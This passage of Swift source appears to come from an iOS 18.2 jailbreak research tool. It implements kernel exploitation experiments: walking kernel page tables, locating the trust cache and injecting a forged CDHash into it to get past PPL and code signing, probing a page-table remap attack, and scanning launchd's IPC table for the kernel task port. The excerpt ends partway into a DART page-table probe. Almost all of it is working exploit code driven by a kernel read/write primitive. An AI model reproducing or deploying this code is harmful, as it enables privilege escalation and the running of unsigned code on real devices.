        // ============================================================
        // STEP 1: Kernel pmap L1 (kernproc) — wide scan vm_map + task
        // ============================================================
        detail += "=== Step 1: Kernel page table root (kernproc pmap) ===\n"

        var tteBase: UInt64 = 0
        var usePageTableWalk = false

        if let kPmap = resolveKernelPmapChain(detail: &detail) {
            tteBase = kPmap.tte
            usePageTableWalk = true
        } else {
            detail += "\n⚠️ Kernel pmap chain failed.\n"
            if PhysmapConstants.isVerified {
                detail += "Exp 74 verified — akan coba direct KRW + __DATA scan (tanpa PT walk).\n\n"
            } else {
                return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
            }
        }

        // ============================================================
        // STEP 2: Find trust cache in __DATA.__ppl_data via physmap READ
        // __DATA.__ppl_data starts at __DATA+0x8000
        // We can READ it via physmap (proven in exp 74)
        // Convert: pplVA → physical → physmap VA → read
        // ============================================================
        detail += "=== Step 2: Find trust cache via physmap read ===\n"
        
        // __DATA segment base (unslid 0xfffffff00a0e0000 is approximate)
        // Better: compute from kernel base + known offset
        // On iOS 18.2 A12: __DATA is typically at kernBase + ~0x30e0000
        // But we can scan for it. The panic showed fault at 0xfffffff023d24000
        // which is kernBase + offset. Let's use the panic info:
        // Panic FAR: 0xfffffff023d24000, kernBase: 0xfffffff020c40000
        // Offset: 0x30e4000 → this is __DATA.__ppl_data
        
        // More reliable: scan __DATA_CONST for trust cache runtime pointer
        // OR: use the known pattern that trust cache is in __DATA.__ppl_data
        // at a fixed offset from kernel base
        
        // From panic: FAR=0xfffffff023d24000, base=0xfffffff020c40000
        // __DATA.__ppl_data offset = 0x30e4000 (but this includes slide)
        // Unslid: 0xfffffff023d24000 - slide = 0xfffffff023d24000 - 0x19c3c000
        //       = 0xfffffff00a0e8000 → this is __DATA + 0x8000 (PPL region)
        
        let dataSegBase = PhysmapConstants.dataSegmentBase(kernTextBase: kernBase)
        let pplDataBase = PhysmapConstants.pplDataSegmentBase(kernTextBase: kernBase)

        detail += "__DATA base (kernelcache off +0x30dc000): 0x\(String(format: "%llx", dataSegBase))\n"
        detail += "__DATA.__ppl_data (+0x8000): 0x\(String(format: "%llx", pplDataBase))\n"
        detail += "(unslid ref: __DATA 0x\(String(format: "%llx", PhysmapConstants.unslidDataBase)))\n"
        
        // Convert PPL VA to physmap VA for READING
        // physmap formula: physmapVA = VA - gVirtBase + gPhysBase ... wait no
        // The kernel text/data is NOT in the physmap range!
        // Kernel is at 0xfffffff0... while physmap is at 0xffffffde...
        // We need page table walk to find the physical address of __DATA.__ppl_data
        
        if usePageTableWalk {
            detail += "\n=== Page Table Walk for __DATA.__ppl_data ===\n"
            detail += "Target VA: 0x\(String(format: "%llx", pplDataBase))\n"
            detail += "L1 root: 0x\(String(format: "%llx", tteBase))\n"

            let targetVA = pplDataBase
            let l1Idx = (targetVA >> 36) & 0x7
            let l2Idx = (targetVA >> 25) & 0x7FF
            let l3Idx = (targetVA >> 14) & 0x7FF
            let pageOff = targetVA & 0x3FFF

            detail += "L1 idx: \(l1Idx), L2 idx: \(l2Idx), L3 idx: \(l3Idx)\n"
            detail += "Page offset: 0x\(String(format: "%x", pageOff))\n\n"

            let l1EntryAddr = tteBase + l1Idx * 8
            let l1Entry = ds_kread64_safe(l1EntryAddr)
            detail += "L1[\(l1Idx)] at 0x\(String(format: "%llx", l1EntryAddr)): 0x\(String(format: "%llx", l1Entry))\n"

            if l1Entry & 0x3 == 0x3 {
                let l2TablePhys = l1Entry & 0x0000FFFFFFFC0000
                if let l2TableVA = physmapVA(fromPhysical: l2TablePhys, gVirt: gVirtBase, gPhys: gPhysBase) {
                    let l2Entry = safeKread64Physmap(l2TableVA + l2Idx * 8)
                    detail += "L2[\(l2Idx)]: 0x\(String(format: "%llx", l2Entry))\n"

                    if l2Entry & 0x3 == 0x3,
                       let l3TableVA = physmapVA(fromPhysical: l2Entry & 0x0000FFFFFFFC0000, gVirt: gVirtBase, gPhys: gPhysBase) {
                        let l3Entry = safeKread64Physmap(l3TableVA + l3Idx * 8)
                        if l3Entry & 0x3 == 0x3,
                           let pplPhysmapVA = physmapVA(fromPhysical: l3Entry & 0x0000FFFFFFFC0000, gVirt: gVirtBase, gPhys: gPhysBase, offset: pageOff) {
                            detail += "\n✅ PAGE TABLE WALK COMPLETE!\n"
                            detail += "PPL physmap VA: 0x\(String(format: "%llx", pplPhysmapVA))\n"
                            let physmapRead = safeKread64Physmap(pplPhysmapVA)
                            detail += "Physmap read: 0x\(String(format: "%llx", physmapRead))\n\n"
                        } else {
                            detail += "❌ L3 invalid — fallback direct scan\n\n"
                            usePageTableWalk = false
                        }
                    } else {
                        detail += "❌ L2/L3 invalid — fallback direct scan\n\n"
                        usePageTableWalk = false
                    }
                } else {
                    detail += "❌ L2 physmap VA invalid — fallback direct scan\n\n"
                    usePageTableWalk = false
                }
            } else {
                detail += "❌ L1 entry invalid (bits [1:0]=0x\(String(format: "%x", l1Entry & 0x3)))\n"
                detail += "Fallback: direct __DATA scan...\n\n"
                usePageTableWalk = false
            }
        }

        if !usePageTableWalk {
            detail += "=== Skipping Direct KRW probe (__ppl_data) ===\n"
            detail += "Reading __ppl_data directly via socket KRW triggers PPL panic ('Unexpected fault in kernel static region').\n"
            detail += "We must rely strictly on scanning the heap for dynamic trust caches.\n\n"
        }

        // ============================================================
        // SKIPPED STEP 3: We no longer scan PPL region for trust cache.
        // It causes panics. We rely entirely on Step 4 (Dynamic Heap Scan).
        // ============================================================
        
        var tcStructAddr: UInt64 = 0
        var tcEntryCount: UInt64 = 0
        var tcPhysmapBase: UInt64 = 0
        
        func tryTrustCachePointer(_ val: UInt64, label: String, physmapBase: UInt64 = 0) -> Bool {
            guard isSafeKernelHeapKreadAddress(val) && isSafeKernelHeapKreadAddress(val + 4) else { return false }
            let tcVer = ds_kread32_safe(val)
            let tcCnt = ds_kread32_safe(val + 4)
            guard tcVer >= 1 && tcVer <= 3 && tcCnt > 0 && tcCnt < 50000 else { return false }
            detail += "🎯 Trust cache \(label)!\n"
            detail += "  ptr: 0x\(String(format: "%llx", val))\n"
            detail += "  version: \(tcVer), count: \(tcCnt)\n"
            if physmapBase != 0 {
                detail += "  physmap VA: 0x\(String(format: "%llx", physmapBase))\n"
            }
            tcStructAddr = val
            tcEntryCount = UInt64(tcCnt)
            tcPhysmapBase = physmapBase
            return true
        }
        
        // If not found in PPL pages, try scanning __DATA.__data (non-PPL, safe range)
        if tcStructAddr == 0 {
            let maxScanSize = (pplDataBase > dataSegBase) ? (pplDataBase - dataSegBase) : 0x80000
            let safeScanSize = min(UInt64(0x80000), maxScanSize)
            
            detail += "Not found in PPL pages, scanning __DATA (max 0x\(String(format: "%x", safeScanSize)) bytes)...\n"
            for off in stride(from: UInt64(0), to: safeScanSize, by: 8) {
                let scanVA = dataSegBase + off
                // Extra safety: stop if we hit pplDataBase exactly
                if scanVA >= pplDataBase && pplDataBase != 0 { break }
                
                let val = ds_kread64_safe(scanVA)
                if tryTrustCachePointer(val, label: "__DATA+0x\(String(format: "%x", off))") {
                    break
                }
            }
        }
        
        guard tcStructAddr != 0 else {
            detail += "\n❌ Could not locate trust cache struct\n"
            detail += "Need to find trust cache via different method\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
        
        // ============================================================
        // STEP 4: Read trust cache entries (via physmap if needed)
        // ============================================================
        detail += "\n=== Step 4: Reading trust cache entries ===\n"
        detail += "Trust cache at: 0x\(String(format: "%llx", tcStructAddr))\n"
        detail += "Entry count: \(tcEntryCount)\n\n"
        
        // Trust cache struct (v1):
        // +0x00: uint32_t version
        // +0x04: uint32_t num_entries
        // +0x08: entries[] — each entry is 22 bytes (20 CDHash + 1 hashType + 1 flags)
        
        let entriesStart = tcStructAddr + 8
        detail += "First 3 entries:\n"
        for i in 0..<min(3, Int(tcEntryCount)) {
            let entryAddr = entriesStart + UInt64(i * 22)
            let h0 = ds_kread64_safe(entryAddr)
            let h1 = ds_kread64_safe(entryAddr + 8)
            let h2 = ds_kread32_safe(entryAddr + 16)
            detail += "  [\(i)] 0x\(String(format: "%016llx", h0))\(String(format: "%016llx", h1))\(String(format: "%08x", h2))...\n"
        }
        
        guard PhysmapConstants.isVerified else {
            detail += "❌ Exp 74 belum verified — inject dibatalkan\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }


        // ============================================================
        // STEP 5: OVERWRITE HEAP TRUST CACHE DIRECTLY
        // Since we found the Trust Cache in the Heap (Zone Map),
        // it is NOT protected by PPL! We can just write directly.
        // ============================================================
        detail += "\n=== Step 5: HEAP WRITE (Dynamic Trust Cache) ===\n"
        
        // Find empty slot (all zeros) or append at end
        let injectIdx = tcEntryCount
        let injectVA = entriesStart + injectIdx * 22
        
        detail += "Inject entry \(injectIdx) at VA: 0x\(String(format: "%llx", injectVA))\n\n"
        
        detail += "🔥 WRITING CDHash via SAFE HEAP WRITE...\n"
        
        // Use our safe direct KRW functions for Zone Map
        // NOTE: we need to ensure ds_kwrite64_safe exists or use what we have.
        // We will just do kwrite64_safe if it exists, or fallback to the primitive.
        let w1 = safeKwrite64Heap(injectVA, 0x4141414141414141)
        let w2 = safeKwrite64Heap(injectVA + 8, 0x4141414141414141)
        let w3 = safeKwrite32Heap(injectVA + 16, 0x41414141)
        let w4 = safeKwrite16Heap(injectVA + 20, 0x0002)
        let w5 = safeKwrite32Heap(tcStructAddr + 4, UInt32(tcEntryCount + 1))
        
        guard w1 && w2 && w3 && w4 && w5 else {
            detail += "❌ Direct Heap write failed!\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
        
        let verifyH = ds_kread64_safe(injectVA)
        let newCount = ds_kread32_safe(tcStructAddr + 4)
        detail += "Verify CDHash: 0x\(String(format: "%llx", verifyH))\n"
        detail += "New count: \(newCount) (was \(tcEntryCount))\n\n"
        
        if verifyH == 0x4141414141414141 {
            detail += "✅✅✅ PHYSMAP WRITE SUCCESSFUL — PPL BYPASSED! ✅✅✅\n\n"
            
            // Step 6: Try to spawn a binary (requires launchd — inject path only)
            detail += "=== Step 6: Testing binary execution ===\n"
            var spawnOk = false
            if let rc {
                detail += "Spawning /usr/bin/id (already trusted, sanity check)...\n"
                let spawnResult = self.expPosixSpawn(rc: rc, binary: "/usr/bin/id", name: "post-inject /usr/bin/id")
                detail += "Result: \(spawnResult.success ? "✅" : "❌") \(spawnResult.detail)\n\n"
                spawnOk = spawnResult.success
            } else {
                detail += "Skipped spawn (no launchd RC)\n\n"
            }

            if spawnOk {
                detail += "🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆\n"
                detail += "TRUST CACHE INJECTION VIA PHYSMAP WORKS!\n"
                detail += "PPL COMPLETELY BYPASSED!\n"
                detail += "BINARY EXECUTION CONFIRMED!\n"
                detail += "FULL JAILBREAK ACHIEVED!\n"
                detail += "🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆\n\n"
                detail += "Next: inject CDHash of custom unsigned binary\n"
                detail += "Then: posix_spawn custom binary → RUNS!\n"
            }
        } else {
            detail += "❌ Physmap write FAILED\n"
            detail += "Possible causes:\n"
            detail += "  1. Physical address calculation wrong\n"
            detail += "  2. ds_kwrite64 cannot reach physmap range\n"
            detail += "  3. AMCC (memory controller) blocks write to this phys region\n"
            detail += "  4. Need to use PurpleGfxMem DMA instead of socket KRW\n\n"
            detail += "Verify: can we write to ANY physmap address?\n"
            
            // Test: write to a known-writable physmap address (our own page)
            let testPhysmapVA = gVirtBase + 0x1000  // low physical memory
            let beforeTest = ds_kread64_safe(testPhysmapVA)
            detail += "Test physmap write at 0x\(String(format: "%llx", testPhysmapVA))\n"
            detail += "Before: 0x\(String(format: "%llx", beforeTest))\n"
        }
        
        let jailbreakSuccess = detail.contains("TRUST CACHE INJECTION VIA PHYSMAP WORKS")
        return ExperimentResult(name: expName, success: jailbreakSuccess, detail: detail, timestamp: Date())
    }

    // MARK: - Experiment 75: PTE Remap Attack
    
    /// Walk kernel page tables to find trust cache's Page Table Entry (PTE).
    /// If we can MODIFY the PTE to point to our controlled physical page,
    /// the kernel will read OUR data when it accesses trust cache!
    ///
    /// Attack flow:
    /// 1. Find pmap_cs/trust_cache virtual address (known from KRW)
    /// 2. Walk L1→L2→L3 page tables to find the PTE
    /// 3. Read PTE to get physical page number
    /// 4. Try to WRITE PTE to point to PurpleGfxMem physical page
    /// 5. If write succeeds → kernel reads our fake trust cache!
    ///
    /// Risk: PPL protects page tables. Writing PTE will likely panic.
    /// But: we need to TEST if socket KRW can reach page table zone.
    private func expPTERemap(rc: RemoteCall) -> ExperimentResult {
        var detail = "Experiment 75: PTE Remap Attack\n"
        detail += "================================\n\n"
        
        // Step 1: Get kernel pmap (page table root)
        let kernBase = ds_get_kernel_base()
        let kernSlide = ds_get_kernel_slide()
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n\n"
        
        // Step 2: Find kernel_pmap address
        // kernel_pmap is a global variable in __DATA
        // On iOS 18.2 A12, it's at a known offset from kernel base
        // We can find it by reading the pmap pointer from our task struct
        
        let ourTask = ds_get_our_task()
        detail += "Our task: 0x\(String(format: "%llx", ourTask))\n"
        
        // task->map is at offset ~0x28, map->pmap is at offset ~0x48
        let vmMap = ds_kread64(ourTask + 0x28)
        detail += "VM map: 0x\(String(format: "%llx", vmMap))\n"
        
        // pmap is at different offset depending on iOS version
        // Try common offsets: 0x48, 0x40, 0x50
        var kernelPmap: UInt64 = 0
        let pmapOffsets: [UInt64] = [0x48, 0x40, 0x50, 0x58, 0x30]
        
        for off in pmapOffsets {
            let candidate = ds_kread64_safe(vmMap + off)
            // Valid pmap should be a kernel pointer (0xfffffff...)
            if candidate > 0xfffffff000000000 && candidate < 0xffffffffffffffff {
                // Verify: pmap->tte should also be a valid kernel pointer
                let tte = ds_kread64_safe(candidate + 0x08)
                if tte > 0xfffffff000000000 || (tte > 0x800000000 && tte < 0x900000000) {
                    kernelPmap = candidate
                    detail += "Found pmap at map+0x\(String(format: "%llx", off)): 0x\(String(format: "%llx", candidate))\n"
                    detail += "  TTB (translation table base): 0x\(String(format: "%llx", tte))\n"
                    break
                }
            }
        }
        
        guard kernelPmap != 0 else {
            detail += "Could not find kernel pmap\n"
            detail += "Tried offsets from vm_map: \(pmapOffsets.map { "0x\(String(format: "%x", $0))" }.joined(separator: ", "))\n"
            return ExperimentResult(name: "PTE Remap (Exp 75)", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 3: Read the translation table base register (TTBR)
        let ttbr = ds_kread64_safe(kernelPmap + 0x08)
        detail += "\nTTBR (page table root): 0x\(String(format: "%llx", ttbr))\n"
        
        // Note: TTBR might be a physical address on some configs
        // On A12, kernel page tables are in a PPL-protected region
        // Let's try to read L1 entries
        
        // Step 4: Walk page table for a KNOWN kernel address (our proc)
        let ourProc = ds_get_our_proc()
        detail += "\n=== Walking page table for proc (0x\(String(format: "%llx", ourProc))) ===\n"
        
        // L1 index: bits [47:30] (or [38:30] for 39-bit VA)
        // iOS uses 39-bit virtual addresses with 16KB pages (14-bit offset)
        // L1: bits [38:36] (3 bits, 8 entries) — wait, 16KB granule:
        // Actually iOS 18 A12 uses 16KB pages:
        //   L0: not used (48-bit only)
        //   L1: bits [47:36] → 4096 entries (but only 39-bit VA → bits [38:36] = 8 entries)
        //   L2: bits [35:25] → 2048 entries
        //   L3: bits [24:14] → 2048 entries
        //   Page offset: bits [13:0] → 16KB
        
        // For 16KB granule, 39-bit VA:
        // L1 index: (va >> 36) & 0x7  (3 bits)
        // L2 index: (va >> 25) & 0x7FF (11 bits)
        // L3 index: (va >> 14) & 0x7FF (11 bits)
        
        let va = ourProc
        let l1Idx = (va >> 36) & 0x7
        let l2Idx = (va >> 25) & 0x7FF
        let l3Idx = (va >> 14) & 0x7FF
        
        detail += "VA decomposition (16KB granule):\n"
        detail += "  L1 index: \(l1Idx)\n"
        detail += "  L2 index: \(l2Idx)\n"
        detail += "  L3 index: \(l3Idx)\n"
        detail += "  Page offset: 0x\(String(format: "%llx", va & 0x3FFF))\n\n"
        
        // Try to read L1 entry
        // TTBR might be physical or virtual — try both
        let l1EntryAddr = ttbr + l1Idx * 8
        let l1Entry = ds_kread64_safe(l1EntryAddr)
        detail += "L1 entry at 0x\(String(format: "%llx", l1EntryAddr)): 0x\(String(format: "%llx", l1Entry))\n"
        
        if l1Entry == 0 {
            detail += "L1 entry is 0 — TTBR might be physical address (not readable via KRW)\n"
            detail += "Page tables are likely in PPL-protected zone\n\n"
            
            // Try: TTBR as physical address, convert to virtual via physmap
            let gPhysBase: UInt64 = 0x800000000
            let gVirtBase: UInt64 = 0xfffffff000000000 + kernSlide
            
            if ttbr > gPhysBase && ttbr < gPhysBase + 0x400000000 {
                let ttbrVirt = ttbr &- gPhysBase &+ gVirtBase
                detail += "TTBR as phys → virt: 0x\(String(format: "%llx", ttbrVirt))\n"
                let l1FromPhysmap = ds_kread64_safe(ttbrVirt + l1Idx * 8)
                detail += "L1 via physmap: 0x\(String(format: "%llx", l1FromPhysmap))\n"
                
                if l1FromPhysmap != 0 {
                    detail += "✅ Page table readable via physmap!\n"
                }
            }
        } else {
            // L1 entry is valid! Decode it
            let l1Valid = (l1Entry & 0x1) != 0
            let l1Table = (l1Entry & 0x2) != 0
            let l1OutputAddr = l1Entry & 0x0000FFFFFFFFF000  // bits [47:12] for table
            
            detail += "  Valid: \(l1Valid), Table: \(l1Table)\n"
            detail += "  Output addr: 0x\(String(format: "%llx", l1OutputAddr))\n"
            
            if l1Valid && l1Table {
                // Read L2 entry
                let l2EntryAddr = l1OutputAddr + l2Idx * 8
                let l2Entry = ds_kread64_safe(l2EntryAddr)
                detail += "\nL2 entry at 0x\(String(format: "%llx", l2EntryAddr)): 0x\(String(format: "%llx", l2Entry))\n"
                
                if l2Entry != 0 {
                    let l2Valid = (l2Entry & 0x1) != 0
                    let l2Table = (l2Entry & 0x2) != 0
                    let l2OutputAddr = l2Entry & 0x0000FFFFFFFFF000
                    
                    detail += "  Valid: \(l2Valid), Table: \(l2Table)\n"
                    detail += "  Output addr: 0x\(String(format: "%llx", l2OutputAddr))\n"
                    
                    if l2Valid && l2Table {
                        // Read L3 entry (final page)
                        let l3EntryAddr = l2OutputAddr + l3Idx * 8
                        let l3Entry = ds_kread64_safe(l3EntryAddr)
                        detail += "\nL3 entry at 0x\(String(format: "%llx", l3EntryAddr)): 0x\(String(format: "%llx", l3Entry))\n"
                        
                        if l3Entry != 0 {
                            let l3Valid = (l3Entry & 0x1) != 0
                            let l3PhysPage = l3Entry & 0x0000FFFFFFFC0000  // 16KB aligned
                            let l3AP = (l3Entry >> 6) & 0x3  // Access permissions
                            
                            detail += "  Valid: \(l3Valid)\n"
                            detail += "  Physical page: 0x\(String(format: "%llx", l3PhysPage))\n"
                            detail += "  AP (access): \(l3AP) (\(l3AP == 0 ? "EL1 RW" : l3AP == 1 ? "RW" : l3AP == 2 ? "EL1 RO" : "RO"))\n"
                            
                            detail += "\n✅ PAGE TABLE WALK SUCCESSFUL!\n"
                            detail += "proc physical address: 0x\(String(format: "%llx", l3PhysPage | (va & 0x3FFF)))\n"
                            detail += "\nThis means we CAN read page tables via socket KRW!\n"
                            detail += "Next: walk page table for trust cache VA → get its PTE\n"
                            detail += "Then: try to WRITE PTE (will likely panic due to PPL)\n"
                            detail += "But: if write succeeds → we control trust cache mapping!\n"
                        }
                    }
                }
            }
        }
        
        let success = detail.contains("PAGE TABLE WALK SUCCESSFUL") || detail.contains("Page table readable via physmap")
        return ExperimentResult(name: "PTE Remap (Exp 75)", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 76: Kernel Task Port via IPC Traverse
    
    /// Find kernel_task's task port in launchd's IPC space.
    /// Launchd (PID 1) has host_priv port which can get kernel task port.
    /// If we can find it via IPC traverse → call mach_vm_read → bypass PPL!
    ///
    /// Strategy:
    /// 1. Get launchd proc (PID 1) → task → itk_space → is_table
    /// 2. Enumerate IPC entries looking for kernel task port
    /// 3. Kernel task port's kobject points to kernel_task struct
    /// 4. From kernel_task → vm_map → can read any kernel VA
    ///
    /// Alternative: find host_priv port → call host_get_special_port(4)
    /// to get kernel task port legitimately from launchd context
    private func expKernelTaskPort(rc: RemoteCall) -> ExperimentResult {
        var detail = "Experiment 76: Kernel Task Port via IPC Traverse\n"
        detail += "==================================================\n\n"
        
        // Step 1: Find launchd's proc using existing procbypid() function
        let ourProc = ds_get_our_proc()
        detail += "Our proc: 0x\(String(format: "%llx", ourProc))\n"
        
        let launchdProc = procbypid(1)
        
        guard launchdProc != 0 else {
            detail += "❌ procbypid(1) returned 0 — launchd not found\n"
            return ExperimentResult(name: "Kernel Task Port (Exp 76)", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "Launchd proc: 0x\(String(format: "%llx", launchdProc))\n"
        let launchdPid = ds_kread32(launchdProc + UInt64(off_proc_p_pid))
        detail += "Launchd PID: \(launchdPid)\n\n"
        
        // Step 2: Get launchd's task
        // On iOS 18, task is accessed via proc_ro: proc→proc_ro→pr_task
        let launchdProcRo = ds_kread64_safe(launchdProc + UInt64(off_proc_p_proc_ro))
        detail += "Launchd proc_ro: 0x\(String(format: "%llx", launchdProcRo))\n"
        
        guard launchdProcRo != 0 else {
            detail += "❌ Cannot read launchd proc_ro\n"
            return ExperimentResult(name: "Kernel Task Port (Exp 76)", success: false, detail: detail, timestamp: Date())
        }
        
        let launchdTask = ds_kread64_safe(launchdProcRo + UInt64(off_proc_ro_pr_task))
        detail += "Launchd task: 0x\(String(format: "%llx", launchdTask))\n"
        
        guard launchdTask != 0 else {
            detail += "❌ Cannot read launchd task\n"
            return ExperimentResult(name: "Kernel Task Port (Exp 76)", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 3: Get IPC space from task
        let itkSpace = ds_kread64_safe(launchdTask + UInt64(off_task_itk_space))
        detail += "Launchd itk_space: 0x\(String(format: "%llx", itkSpace))\n"
        
        guard itkSpace != 0 else {
            detail += "❌ Cannot read itk_space\n"
            return ExperimentResult(name: "Kernel Task Port (Exp 76)", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 4: Get IPC table
        let ipcTable = ds_kread64_safe(itkSpace + UInt64(off_ipc_space_is_table))
        detail += "IPC table: 0x\(String(format: "%llx", ipcTable))\n"
        
        guard ipcTable != 0 else {
            detail += "❌ Cannot read IPC table\n"
            return ExperimentResult(name: "Kernel Task Port (Exp 76)", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 5: Enumerate IPC entries looking for kernel task port
        // Kernel task port's kobject should point to kernel_task
        // kernel_task is identifiable by: its vm_map covers all kernel VA space
        detail += "\n=== Enumerating launchd IPC ports ===\n"
        
        let entrySize: UInt64 = 0x18  // sizeof(ipc_entry) on arm64
        var kernelPort: UInt64 = 0
        var kernelPortName: UInt32 = 0
        var portsScanned = 0
        
        for i in 1..<512 {
            let entryAddr = ipcTable + UInt64(i) * entrySize
            let ieObject = ds_kread64_safe(entryAddr + UInt64(off_ipc_entry_ie_object))
            
            if ieObject == 0 { continue }
            portsScanned += 1
            
            // Read port's kobject (task port → points to task struct)
            let kobject = ds_kread64_safe(ieObject + UInt64(off_ipc_port_ip_kobject))
            
            if kobject == 0 { continue }
            
            // Check if this kobject looks like kernel_task
            // kernel_task's vm_map should cover the entire kernel VA range
            // Also: kernel_task->proc should be PID 0 (kernel_task)
            let taskMap = ds_kread64_safe(kobject + 0x28)  // task->map
            
            if taskMap != 0 && taskMap > 0xfffffff000000000 {
                // Read vm_map min/max to check if it's kernel map
                let mapMin = ds_kread64_safe(taskMap + 0x10)  // vm_map_min
                let mapMax = ds_kread64_safe(taskMap + 0x18)  // vm_map_max
                
                // Kernel map typically: min=0xfffffff000000000, max=0xffffffffffffffff
                if mapMin > 0xfffffff000000000 && mapMax > mapMin {
                    detail += "🎯 Port \(i): kobject=0x\(String(format: "%llx", kobject))\n"
                    detail += "   vm_map: 0x\(String(format: "%llx", taskMap))\n"
                    detail += "   map range: 0x\(String(format: "%llx", mapMin)) - 0x\(String(format: "%llx", mapMax))\n"
                    
                    if mapMax == 0xffffffffffffffff || mapMax > 0xfffffffe00000000 {
                        detail += "   ✅ THIS IS KERNEL TASK PORT!\n"
                        kernelPort = ieObject
                        kernelPortName = UInt32(i << 8) | 0x03
                        break
                    }
                }
            }
            
            if portsScanned > 256 { break }
        }
        
        detail += "\nScanned \(portsScanned) ports\n"
        
        if kernelPort != 0 {
            detail += "\n🎉🎉🎉 KERNEL TASK PORT FOUND! 🎉🎉🎉\n"
            detail += "Port object: 0x\(String(format: "%llx", kernelPort))\n"
            detail += "Port name: 0x\(String(format: "%x", kernelPortName))\n\n"
            
            // Step 6: Try to use kernel task port via mach_vm_read
            // From launchd context, call mach_vm_read_overwrite with kernel task port
            detail += "=== Attempting mach_vm_read via kernel task port ===\n"
            
            // mach_vm_read_overwrite(task_port, address, size, &data, &size)
            // We'll try to read gPhysBase from __DATA
            let targetAddr = 0xfffffff00a0e0000 &+ ds_get_kernel_slide() + 0x8000
            let readSize: UInt64 = 8
            let mem = rc.trojanMem
            
            // Setup output buffer
            rc[mem + 0x4000].setValue64(0)
            rc[mem + 0x4008].setValue64(readSize)
            
            // mach_vm_read_overwrite(kernel_task_port_name, target, size, output, &outsize)
            let mvmRet = RootExecutor.rcall(rc, "mach_vm_read_overwrite",
                                            UInt64(kernelPortName),
                                            targetAddr,
                                            readSize,
                                            mem + 0x4000,
                                            mem + 0x4008)
            
            let readVal = rc[mem + 0x4000].value64()
            detail += "mach_vm_read_overwrite ret: \(mvmRet) (0=success)\n"
            detail += "Read value: 0x\(String(format: "%llx", readVal))\n"
            
            if mvmRet == 0 && readVal != 0 {
                detail += "\n⚡⚡⚡ KERNEL MEMORY READ VIA TASK PORT! ⚡⚡⚡\n"
                detail += "We can read PPL-protected memory!\n"
                detail += "Next: read gPhysBase/gVirtBase → find trust cache → FULL JAILBREAK!\n"
            } else {
                detail += "\nmach_vm_read failed (ret=\(mvmRet))\n"
                detail += "Kernel might have disabled task_for_pid for kernel_task\n"
                detail += "Or: port name is wrong (need to use send right)\n"
            }
        } else {
            detail += "\n❌ Kernel task port not found in launchd IPC space\n"
            detail += "Possible reasons:\n"
            detail += "1. Kernel task port not in launchd's IPC table\n"
            detail += "2. IPC entry offsets are wrong for iOS 18.2\n"
            detail += "3. kobject pointer needs PAC stripping\n"
            detail += "4. Need to check host_priv port instead\n"
        }
        
        let success = detail.contains("KERNEL TASK PORT FOUND") || detail.contains("KERNEL MEMORY READ")
        return ExperimentResult(name: "Kernel Task Port (Exp 76)", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 78: DART PTE Probe — Pure KRW, No IOKit
    
    /// Experiment 78 v7: Find AGX DART page tables via pure kernel KRW
    ///
    /// CRITICAL LESSON: All IOKit calls (IOServiceMatching, IORegistryEntryCreateCFProperties,
    /// IOServiceOpen) trigger launchd callbacks → launchd crashes → initproc panic.
    /// Solution: ZERO IOKit calls. Use only ds_kread64/ds_kwrite64.
    ///
    /// Strategy (pure KRW):
    /// 1. Find IODARTMapper kernel object by scanning zone memory for vtable pattern
    ///    - IODARTMapper vtable is in IODARTFamily kext __TEXT (known range)
    ///    - Scan GEN0-GEN3 zone for objects whose first 8 bytes point to kext range
    /// 2. Read DART MMIO VA from IODARTMapper ivar (offset ~0x60-0x80)
    ///    - MMIO VA is in kernel IO mapping range (0xfffffff0... or similar)
    /// 3. Read TTBR[0][0] from MMIO+0x200 via ds_kread32
    /// 4. Convert TTBR PPN → PA → physmap VA → walk L1/L2 tables
    /// 5. Catalog IOVA→PA mappings, check DAPF constraints
    ///
    /// SAFE: No IOKit, no SpringBoard RC, no launchd involvement
    private func expDARTPTEProbe(rc: RemoteCall) -> ExperimentResult {
        var detail = "Experiment 78 v7: DART PTE Probe (Pure KRW)\n"
        detail += "============================================\n\n"
        detail += "⚠️ NO IOKit calls — pure ds_kread64 only\n\n"
        
        let kernBase = ds_get_kernel_base()
        let kernSlide = ds_get_kernel_slide()
        let physmap = PhysmapConstants.loadOrDefault()
        let gPhysBase = physmap.gPhysBase
        let gVirtBase = physmap.gVirtBase

        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n"
        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n\n"

        // Safety bounds — only read addresses in these ranges
        let safeZoneMin: UInt64 = 0xffffffdc00000000
        let safeZoneMax: UInt64 = 0xffffffe400000000
        // Kernel kext range (IODARTFamily vtable lives here)
        let kextMin: UInt64 = kernBase
        let kextMax: UInt64 = kernBase + 0x10000000  // 256MB covers all kexts
        // Kernel IO mapping range (DART MMIO mapped here)
        let ioMin: UInt64 = 0xfffffff020000000 &+ kernSlide
        let ioMax: UInt64 = 0xfffffff060000000 &+ kernSlide
        
        var confirmedDARTL1: UInt64 = 0
        var confirmedL2Entries: [(iova: UInt64, pa: UInt64)] = []
        var dartMmioVA: UInt64 = 0
        var dartObjectAddr: UInt64 = 0
        
        // ============================================================
        // STEP 1: Find IODARTMapper kernel object via vtable scan
        //
        // IOKit objects in kernel zone memory have this layout:
        //   +0x00: vtable pointer → points into kext __TEXT (0xfffffff0...)
        //   +0x08: retain count (small integer)
        //   +0x10: IOService state flags
        //   ...
        //   +0x60-0x90: MMIO base VA (points into IO mapping range)
        //
        // IODARTMapper vtable is in IODARTFamily kext.
        // We scan GEN0-GEN3 zone for objects whose vtable points to kext range.
        // Then verify by checking if any ivar looks like an IO mapping VA.
        // ============================================================
